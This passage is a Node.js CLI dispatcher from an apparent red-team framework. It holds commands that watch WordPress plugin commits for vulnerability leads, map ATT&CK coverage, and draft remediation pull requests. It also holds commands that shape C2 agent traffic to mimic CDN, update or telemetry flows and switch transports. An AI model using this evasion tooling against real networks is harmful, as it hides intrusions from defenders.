      if (sub === 'scan') {
        const fixture = opt('--fixture');
        const live = args.includes('--live');
        if (!fixture && !live) return { ok: false, error: 'commitwatch-live-not-requested', reason: 'scan needs --fixture <file> (offline, the SAME code) or --live (GATED: wordpress.org hosts only, read-only GETs, operator-deliberate) — refusing to guess', doctrine: cw.DOCTRINE };
        const source = fixture ? cw.fixtureSource(fixture) : cw.liveSource({ allow: live });
        if (!source.ok) return { ...source, doctrine: cw.DOCTRINE };
        const r = await cw.scan({ source, targetsFile: opt('--targets') });
        if (r.ok) {
          console.log(`watched ${r.watched} plugin(s), scanned ${r.scanned} — ${r.changesets} changeset(s), ${r.leads.length} lead(s), ${r.noise} noise, ${r.errors.length} fetch error(s)`);
          for (const l of r.ranked) console.log('  ' + fmt(l));
          for (const err of r.errors) console.log(`  ERROR ${err.slug}: ${err.error} — ${err.reason}`);
          console.log(cw.DOCTRINE);
        }
        return r;
      }
      if (sub === 'report') {
        const r = cw.report({ all: args.includes('--all') });
        if (!r.leads.length) console.log(r.note || '(no leads in the most recent scan — commitwatch report --all for the recorded ring)');
        for (const l of r.leads) {
          console.log(fmt(l));
          console.log('    why: ' + l.why);
          if (l.suggestedSeed) console.log('    seed: node tools/cli.mjs variantsweep <corpus> --sig ' + JSON.stringify({ kind: l.suggestedSeed.kind, class: l.suggestedSeed.class, anchors: l.suggestedSeed.anchors }) + '  (BY HAND — the watcher never hunts)');
        }
        console.log(cw.DOCTRINE);
        return r;
      }
      if (sub === 'show') {
        if (!args[1] || args[1].startsWith('--')) throw new Error('commitwatch show needs <slug>');
        const r = cw.show(args[1]);
        if (r.ok) console.log(cw.DOCTRINE);
        return r;
      }
      if (sub === 'targets') {
        const r = cw.loadTargets(opt('--targets'));
        if (r.ok) for (const t of r.targets) console.log(`  ${t.slug}${t.note ? ' — ' + t.note : ''}`);
        return r;
      }
      throw new Error('commitwatch needs scan --fixture f | scan --live [--targets t.json] | report [--all] | show <slug> | targets [--targets t.json]');
    }
    case 'attackbench': {
      // THE ATT&CK COVERAGE BENCHMARK HARNESS (engine/attackbench.mjs + tools/attackbench.mjs):
      // the OFFLINE scaffolding of the lab-validation track (SOTA-VALIDATION-2026-08-25
      // §3.2/§4) — a LOCAL priority catalog (data/attackbench/techniques.json, the §2.5
      // matrix) measured against a code-grounded capability map (data/attackbench/map.json).
      // THE HONESTY GATE: an 'exists' entry whose module is not on disk fails validation
      // loudly; 'planned' entries claim no code. ZERO network (no STIX/TAXII — the scope
      // is a reviewed data file). Every output carries the doctrine + non-claim:
      // capability, never detection; NOT MITRE-affiliated, never 'MITRE-tested'.
      const sub = args[0];
      const opt = (flag) => { const i = args.indexOf(flag); return i !== -1 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : undefined; };
      const ab = await import('./attackbench.mjs');
      if (sub === 'report') {
        const r = ab.report({ catalogFile: opt('--catalog'), mapFile: opt('--map') });
        if (r.ok) {
          console.log(`scope: ${r.coverage.total} technique id(s) — ${r.coverage.mapped} mapped, ${r.coverage.plannedOnly} planned-only, ${r.coverage.gaps} gap(s)  |  capabilities: ${r.capabilities.exists} exists, ${r.capabilities.planned} planned`);
          for (const m of r.mapped) console.log(`  [mapped] ${m.id} ${m.name} — via ${m.entries.join(', ')}`);
          for (const p of r.planned) console.log(`  [planned-only] ${p.id} ${p.name} — ${p.entries.join(', ')} (not built; claims nothing today)`);
          for (const g of r.gapList) console.log(`  [GAP] ${g.id} ${g.name} — ${g.why}`);
          if (r.outOfCatalog.length) console.log(`  out-of-catalog surface (mapped honestly, counted nowhere): ${r.outOfCatalog.map((o) => o.technique).join(', ')}`);
          console.log(r.doctrine);
          console.log(r.nonClaim);
        }
        return r;
      }
      if (sub === 'layer') {
        const r = ab.layer({ catalogFile: opt('--catalog'), mapFile: opt('--map') });
        if (r.ok) {
          const out = opt('--out');
          if (out) { mkdirSync(dirname(out), { recursive: true }); writeFileSync(out, JSON.stringify(r.layer, null, 2) + '\n'); console.log('[out] Navigator layer written to ' + out); }
          console.log(`layer '${r.layer.name}': ${r.layer.techniques.length} technique entries (score 1 = capability exists; 0 = planned/gap — CAPABILITY, never detection)`);
          console.log(r.nonClaim);
        }
        return r;
      }
      if (sub === 'map') {
        const r = ab.mapView({ catalogFile: opt('--catalog'), mapFile: opt('--map') });
        if (r.ok) {
          console.log(`capability map: ${r.entries.length} entries (${r.exists} exists, ${r.planned} planned) — validated against the repo's real files`);
          for (const e of r.entries) console.log(`  [${e.status}] ${e.id} — ${e.techniques.join(', ')}${e.status === 'exists' ? ` — ${e.modules.join(', ')}` : ' — (no modules: planned)'}`);
          console.log(r.doctrine);
        }
        return r;
      }
      throw new Error('attackbench needs report | layer [--out f] | map  ([--catalog f] [--map f] overrides; defaults data/attackbench/techniques.json + map.json)');
    }
    case 'shape': {
      // C2 SHAPING PACK: apply a wire-shape profile to a live agent.
      // 'shape <agentId> [profile] [api]' — profile omitted = the engagement's shape.*
      // settings floor (shape.profile, with shape.batchWindowMin / shape.padding /
      // shape.padRate as overrides). 'plain' clears shaping (today's byte-identical wire).
      if (!args[0] || args[0].startsWith('--')) throw new Error("shape needs <agentId> [profile] [api] — apply a wire-shape profile (plain|cdn-asset|software-update|telemetry-beacon); profile omitted = engagement shape.* settings");
      const { SHAPE_PROFILES } = await import('../engine/malleable.mjs');
      const api = (args.find((a) => typeof a === 'string' && a.startsWith('http')) || 'http://127.0.0.1:8971').replace(/\/+$/, '');
      const eng = (await armedEngagement()) || 'default';
      const s = Settings.for(eng);
      let profileName = args[1] && !args[1].startsWith('http') ? args[1] : null;
      if (!profileName) profileName = s.get('shape.profile');
      const base = SHAPE_PROFILES[profileName];
      if (!base) return { ok: false, error: "unknown shape profile '" + profileName + "' -- known: " + Object.keys(SHAPE_PROFILES).join(', ') };
      const shape = JSON.parse(JSON.stringify({ name: profileName, ...base }));
      const bMin = s.get('shape.batchWindowMin');
      if (bMin > 0) shape.batch = { windowMs: bMin * 60000 };
      if (s.get('shape.padding')) shape.padding = { perCycle: s.get('shape.padRate') };
      const r = await fetch(api + '/api/channel/agent', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'shape', agentId: args[0], shape }) });
      return { httpStatus: r.status, engagement: eng, applied: profileName, batchWindowMin: bMin || 0, padding: s.get('shape.padding') ? s.get('shape.padRate') : false, ...(await r.json()) };
    }
    case 'shapegrade': {
      // Oracle-graded self-measurement (shaping pack part 3): 'shapegrade <agentId> [api]'
      // grades the agent's APPLIED shape against the measured wire (fporacle JA4H ring +
      // flow score); 'shapegrade profiles' lists every library profile's claim
      // pre-deployment. Divergence is reported loudly, never asserted away.
      const { gradeLive, preflightShapes } = await import('../tools/shapegrade.mjs');
      if (args[0] === 'profiles') return preflightShapes();
      if (!args[0] || args[0].startsWith('--')) throw new Error("shapegrade needs <agentId> [api] — grade an agent's applied shape against the measured wire, or 'shapegrade profiles' for pre-deployment claims");
      const grade = await gradeLive(args[0], args[1] || 'http://127.0.0.1:8971');
      // Persist every measured grade (engine/oraclelog.mjs — the flywheel rung). ok:false
      // results (channel dark / no such agent) are NOT scores — nothing to persist there.
      if (!grade || grade.ok !== true) return grade;
      return { ...grade, persistence: recordShapegradeScore({ agentId: args[0], engagement: (await armedEngagement()) || null, grade }) };
    }
    case 'failover': {
      // Oracle-graded adaptive failover (shaping pack part 4): the per-wire preference
      // ranking off the live channel view (delivery health + measured per-wire beacon
      // score + success history; eligibility-gated; operator pin wins).
      // 'failover <agentId> [api]' reads; 'failover <agentId> apply [api]' issues the
      // recommended switch through the audited setTransport path — an explicit operator
      // action; the channel itself never auto-switches.
      if (!args[0] || args[0].startsWith('--')) throw new Error("failover needs <agentId> [apply] [api] — per-wire oracle-graded failover ranking; 'apply' issues the recommended audited switch");
      const api = (args.find((a) => typeof a === 'string' && a.startsWith('http')) || 'http://127.0.0.1:8971').replace(/\/+$/, '');
      const st = await (await fetch(api + '/api/channel')).json();
      if (!st || !st.armed) return { armed: false, error: 'channel not armed — no wires exist to rank' };
      const view = (st.agents || []).find((a) => a.agentId === args[0]);
      if (!view) return { ok: false, agentId: args[0], error: 'no such agent on the armed channel' };
      const plan = view.failover || null;
      const tgRec = view.transportGrade && view.transportGrade.recommendation;
      const rec = plan && plan.recommendation && plan.recommendation.action === 'switch-recommended'
        ? plan.recommendation
        : (tgRec && tgRec.action === 'switch' ? tgRec : null);
      if (args.includes('apply')) {
        if (!rec || !rec.to) return { applied: false, agentId: args[0], reason: 'no switch recommendation to apply (stay/watch in force, or an operator pin) — the ranking is data, never an autonomous act', failover: plan };
        const r = await fetch(api + '/api/channel/agent', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'transport', agentId: args[0], transport: rec.to }) });
        return { applied: r.ok, agentId: args[0], to: rec.to, recommendation: rec, failover: plan };
      }
      return { agentId: args[0], recommendation: rec || (plan && plan.recommendation) || tgRec || null, failover: plan };
    }
    case 'remediate': {
      // THE AUTO-REMEDIATION PR LOOP (roadmap #7 — engine/remediate.mjs + tools/rempr.mjs).
      //   list                                            the engagement's remediation records
      //   draft <findingRef> [--diff <patchfile>] [--file <repoRel>:<contentFile>]... [--verify '<cmd>' [--expect zero|nonzero]]
      //                                                   intake a VALIDATED finding (the validator gate vocabulary) as a remediation record
      //   verify <id> --repo <path>                       materialize the patch against the LOCAL checkout + run the declared probe (MEASURED)
      //   open-pr <id> --repo <path> --gh <owner/repo> [--base main] [--branch name]
      //                                                   THE ONLY push/open path — the operator's explicit act (HITL)
      //   mark <id> merged|rejected                       record the client's act on the lifecycle
      // Gates: remediate.prEnabled (draft/verify/open-pr), remediate.remoteAllow + remediate.ghToken
      // (open-pr). The burner PAT is never an arg here — it lives in the secret-class settings key.
      const sub = args[0];
      const flag = (name) => { const i = args.indexOf('--' + name); return i >= 0 ? args[i + 1] : undefined; };
      const all = (name) => { const out = []; for (let i = 0; i < args.length; i++) if (args[i] === '--' + name && args[i + 1]) out.push(args[i + 1]); return out; };
      const engagement = flag('engagement') || (await armedEngagement()) || 'default';
      const { draftRemediation, verifyRemediation, openRemediationPr, markRemediation } = await import('./rempr.mjs');
      const { listRemediations } = await import('../engine/remediate.mjs');
      const { loadSurface } = await import('../engine/store.mjs');
      if (sub === 'list') {
        return {
          engagement,
          remediations: listRemediations({ engagement }).map((r) => ({
            id: r.id, findingRef: r.findingRef, status: r.status, createdAt: r.createdAt,
            verify: (r.verifyResult && r.verifyResult.verdict) || null,
            pr: (r.pr && r.pr.url) || null,
            title: (r.provenance && r.provenance.finding && r.provenance.finding.title) || null,
          })),
        };
      }
      if (sub === 'draft') {
        const findingRef = args[1];
        if (!findingRef || findingRef.startsWith('--')) throw new Error('remediate draft needs <findingRef> [--diff <patchfile>] [--file <repoRel>:<contentFile>]... [--verify \'<cmd>\' [--expect zero|nonzero]]');
        let patch = null;
        const diffFile = flag('diff');
        const fileSpecs = all('file');
        if (diffFile) patch = { diff: readFileSync(diffFile, 'utf8') };
        if (fileSpecs.length) {
          patch = patch || {};
          patch.files = fileSpecs.map((spec) => {
            const i = spec.indexOf(':');
            if (i <= 0) throw new Error("--file needs <repoRelPath>:<localContentFile> — got '" + spec + "'");
            return { path: spec.slice(0, i), content: readFileSync(spec.slice(i + 1), 'utf8') };
          });
        }
        const verifyCmd = flag('verify');
        const verify = verifyCmd ? { cmd: verifyCmd, expect: flag('expect') } : null;
        const surface = loadSurface(engagement);
        if (!surface) return { ok: false, reason: "no stored surface for engagement '" + engagement + "' — run a campaign first (the loop remediates STORED, validated findings)" };
        return await draftRemediation({ engagement, surface, findingRef, patch, verify });
      }
      if (sub === 'verify') {
        if (!args[1] || args[1].startsWith('--')) throw new Error('remediate verify needs <id> --repo <path>');
        const repoDir = flag('repo');
        if (!repoDir) throw new Error('remediate verify needs --repo <path> — a LOCAL checkout; VARVEL never clones autonomously');
        return await verifyRemediation({ engagement, id: args[1], repoDir });
      }
      if (sub === 'open-pr') {
        if (!args[1] || args[1].startsWith('--')) throw new Error('remediate open-pr needs <id> --repo <path> --gh <owner/repo> [--base main] [--branch name]');
        const repoDir = flag('repo');
        const gh = flag('gh');
        if (!repoDir) throw new Error('remediate open-pr needs --repo <path> — a LOCAL checkout; VARVEL never clones autonomously');
        if (!gh || !/^[^/\s]+\/[^/\s]+$/.test(gh)) throw new Error("remediate open-pr needs --gh <owner/repo> — the client repo the PR targets (a fork/branch the burner account can push to)");
        const [owner, repo] = gh.split('/');
        return await openRemediationPr({ engagement, id: args[1], repoDir, owner, repo, base: flag('base') || 'main', branch: flag('branch') });
      }
      if (sub === 'mark') {
        if (!args[1] || !['merged', 'rejected'].includes(args[2])) throw new Error("remediate mark needs <id> merged|rejected — record the client's act on the lifecycle");
        return await markRemediation({ engagement, id: args[1], to: args[2] });
      }
      throw new Error('remediate needs list | draft <findingRef> | verify <id> --repo <path> | open-pr <id> --repo <path> --gh <owner/repo> | mark <id> merged|rejected');
    }
    default:
      return { error: 'unknown command: ' + String(cmd), usage: USAGE };
  }
}

// Teardown (the Windows/libuv finding, 2026-08-25): process.exit() called immediately
// after fetch() races undici's keep-alive socket teardown and ABORTS the process with
// the 'src\win\async.c UV_HANDLE_CLOSING' assertion (exit 127 — reproduced reliably by
// `h1watch scan` against a loopback mock). Set exitCode and let the event loop drain
// instead: the sockets finish closing first (measured: clean exit in ~100ms). The
// unref'd watchdog force-exits ONLY if a genuinely stuck handle would hang the CLI —
// named loudly, never silent.
function exitClean(code) {
  process.exitCode = code;
  const wd = setTimeout(() => {
    console.error('cli teardown: a handle did not drain within 10s — force-exiting (a leaked handle, honestly named)');
    process.exit(code);
  }, 10000);
  if (wd.unref) wd.unref();
}

main()
  .then((out) => { console.log(JSON.stringify(out, null, 1)); exitClean(out && out.error ? 2 : 0); })
  .catch((e) => { console.log(JSON.stringify({ error: String((e && e.message) || e) })); exitClean(2); });
